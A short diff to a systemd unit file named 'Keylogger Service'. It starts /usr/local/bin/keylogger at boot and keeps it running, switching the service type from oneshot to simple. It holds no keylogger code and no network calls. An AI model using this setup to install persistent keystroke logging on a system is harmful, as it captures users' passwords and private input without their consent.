@@ -3,12 +3,11 @@ Description=Keylogger Service
 ConditionFileIsExecutable=/usr/local/bin/keylogger
 
 [Service]
-Type=oneshot
+Type=simple
 ExecStart=/usr/local/bin/keylogger
 TimeoutSec=0
 StandardOutput=tty
 RemainAfterExit=yes
-SysVStartPriority=99
 
 [Install]
 WantedBy=multi-user.target
